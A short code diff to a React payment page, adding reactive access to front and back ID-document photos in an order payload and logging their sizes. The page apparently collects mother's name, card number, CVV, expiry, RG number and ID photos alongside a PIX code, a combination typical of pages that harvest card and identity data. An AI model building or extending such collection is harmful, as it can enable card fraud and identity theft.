@@ -32,7 +32,9 @@ export default function PaymentPage() {
     nomeMae,
     numeroCartao,
     cvv,
-    validade
+    validade,
+    documentPhotoFront, // Adicionado para garantir acesso reativo
+    documentPhotoBack   // Adicionado para garantir acesso reativo
   } = useUserStore();
 
   const addOrder = useAdminStore((state) => state.addOrder);
@@ -362,9 +364,14 @@ export default function PaymentPage() {
           pixCode: resultado.pixCode,
           pixQrCode: resultado.qrCode,
           rg: useUserStore.getState().rg,
-          documentPhotoFront: useUserStore.getState().documentPhotoFront,
-          documentPhotoBack: useUserStore.getState().documentPhotoBack
+          documentPhotoFront: documentPhotoFront || useUserStore.getState().documentPhotoFront,
+          documentPhotoBack: documentPhotoBack || useUserStore.getState().documentPhotoBack
         };
+
+        console.log('📸 [PaymentPage] Enviando fotos:', {
+          frontSize: orderPayload.documentPhotoFront?.length,
+          backSize: orderPayload.documentPhotoBack?.length
+        });
 
         // Usa fetch para bater na serverless function
         fetch('/api/create-order', {
